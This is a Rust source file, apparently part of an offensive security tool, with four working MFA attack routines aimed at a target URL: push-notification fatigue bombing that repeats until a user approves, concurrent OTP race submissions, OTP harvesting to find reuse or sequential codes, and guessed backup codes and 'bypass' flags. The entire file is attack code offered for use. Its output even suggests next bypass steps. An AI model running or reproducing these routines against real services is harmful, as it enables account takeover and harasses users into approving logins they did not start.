use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn fatigue(url: &str, user: &str, count: u32, delay: u64, timeout: u64) -> anyhow::Result<()> {
    println!("{} MFA Fatigue Bombing", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} User:  {}", "[*]".cyan().bold(), user);
    println!("{} Count: {}", "[*]".cyan().bold(), count);
    println!("{} Delay: {}s", "[*]".cyan().bold(), delay);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let mut sent = 0u32;
    let mut accepted = false;

    for i in 0..count {
        match client.post(url).header("Content-Type", "application/json")
            .body(serde_json::json!({"user": user, "action": "mfa_push"}).to_string()).send().await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                sent += 1;
                let approved = body.contains("approved") || body.contains("accepted") || body.contains("verified");
                let tag = if approved { "APPROVED".green().bold().to_string() } else { "sent".cyan().to_string() };
                print!("\r  {} Push {}/{} status={} {}", "*".cyan(), i + 1, count, status, tag);
                if approved { accepted = true; println!("\n  {} [SUCCESS] MFA push was accepted!", "[+]".green().bold()); break; }
            }
            Err(_) => { print!("\r  {} Push {}/{} error", "*".red(), i + 1, count); }
        }
        if delay > 0 { tokio::time::sleep(Duration::from_secs(delay)).await; }
    }

    println!("\n\n{} {} push notifications sent. Accepted: {}", "[*]".cyan().bold(), sent, if accepted { "YES".green().bold().to_string() } else { "no".to_string() });
    if !accepted { println!("{} Target did not accept any push. Consider OTP or fallback bypass.", "[*]".cyan().bold()); }
    Ok(())
}

pub async fn race(url: &str, user: &str, otp: &str, count: u32, timeout: u64) -> anyhow::Result<()> {
    println!("{} MFA OTP Race Condition", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} User:  {}", "[*]".cyan().bold(), user);
    println!("{} OTP:   {}", "[*]".cyan().bold(), otp);
    println!("{} Attempts: {}", "[*]".cyan().bold(), count);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let mut handles = Vec::new();

    for _ in 0..count {
        let client = client.clone();
        let url = url.to_string();
        let user = user.to_string();
        let otp = otp.to_string();
        handles.push(tokio::spawn(async move {
            client.post(&url).header("Content-Type", "application/json")
                .body(serde_json::json!({"user": user, "otp": otp}).to_string()).send().await
        }));
    }

    let mut results = Vec::new();
    for h in handles {
        if let Ok(Ok(resp)) = h.await {
            let status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();
            let success = body.contains("success") || body.contains("verified") || body.contains("authenticated") || status == 200;
            results.push((status, success, body));
        }
    }

    let successes = results.iter().filter(|r| r.1).count();
    for (i, (status, success, body)) in results.iter().enumerate() {
        let tag = if *success { "SUCCESS".green().bold().to_string() } else { "failed".red().to_string() };
        println!("  {} Attempt {} status={} {}", "*".cyan(), i + 1, status, tag);
        if *success { println!("    {} Response: {}", ">".green().bold(), body.chars().take(200).collect::<String>()); }
    }

    println!("\n{} {}/{} concurrent OTP attempts succeeded", "[*]".cyan().bold(), successes, count);
    if successes > 1 { println!("{} OTP reuse detected — race condition vulnerability!", "[!]".red().bold()); }
    Ok(())
}

pub async fn otp(url: &str, user: &str, timeout: u64, count: u32) -> anyhow::Result<()> {
    println!("{} MFA OTP Prediction / Reuse Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} User:  {}", "[*]".cyan().bold(), user);
    println!("{} Attempts: {}", "[*]".cyan().bold(), count);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let mut otps = Vec::new();

    for i in 0..count {
        match client.post(url).header("Content-Type", "application/json")
            .body(serde_json::json!({"user": user, "action": "generate_otp"}).to_string()).send().await
        {
            Ok(resp) => {
                let body = resp.text().await.unwrap_or_default();
                let otp_val = if let Ok(v) = serde_json::from_str::<serde_json::Value>(&body) {
                    let r = v.get("otp").or(v.get("code")).and_then(|c| c.as_str()).map(|s| s.to_string())
                        .or_else(|| v.get("otp").and_then(|c| c.as_u64()).map(|n| n.to_string()))
                        .unwrap_or_default();
                    r
                } else { String::new() };
                if !otp_val.is_empty() { otps.push(otp_val.clone()); println!("  {} OTP {}: {}", "*".cyan(), i + 1, otp_val); }
            }
            Err(_) => {}
        }
    }

    let mut duplicates = 0;
    for i in 0..otps.len() {
        for j in (i+1)..otps.len() {
            if otps[i] == otps[j] { duplicates += 1; println!("  {} [REUSE] OTP {} and {} are identical: {}", "[!]".red().bold(), i + 1, j + 1, otps[i]); }
        }
    }

    if otps.len() >= 2 {
        let seq: Vec<u64> = otps.iter().filter_map(|s| s.parse().ok()).collect();
        if seq.windows(2).all(|w| w[1] == w[0] + 1) {
            println!("{} [PREDICTABLE] OTPs are sequential (+1)!", "[!]".red().bold());
        }
    }

    println!("\n{} {} OTPs generated, {} duplicates found", "[*]".cyan().bold(), otps.len(), duplicates);
    Ok(())
}

pub async fn fallback(url: &str, user: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} MFA Fallback Bypass", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} User:  {}", "[*]".cyan().bold(), user);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let methods = [
        ("backup_code", "12345678"),
        ("recovery_code", "AAAAAAAA"),
        ("sms", "000000"),
        ("email", "000000"),
        ("backup", "00000000"),
        ("trust", "true"),
        ("remember", "true"),
        ("skip", "true"),
        ("bypass", "true"),
    ];

    let mut results = Vec::new();

    for (method, value) in &methods {
        let body = serde_json::json!({"user": user, "method": method, "code": value, "action": "verify"}).to_string();
        match client.post(url).header("Content-Type", "application/json").body(body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let resp_body = resp.text().await.unwrap_or_default();
                let success = resp_body.contains("success") || resp_body.contains("verified") || resp_body.contains("authenticated") || status == 200;
                let tag = if success { "BYPASSED".red().bold().to_string() } else { "rejected".green().to_string() };
                println!("  {} {:15} status={} {}", "*".cyan(), method, status, tag);
                if success { println!("    {} MFA bypassed via {}!", ">".red().bold(), method); results.push(method.to_string()); }
            }
            Err(_) => { println!("  {} {:15} error", "*".red(), method); }
        }
    }

    if results.is_empty() {
        println!("\n{} No fallback methods bypassed.", "[-]".yellow().bold());
    } else {
        println!("\n{} {} fallback method(s) bypassed!", "[!]".red().bold(), results.len());
    }
    Ok(())
}
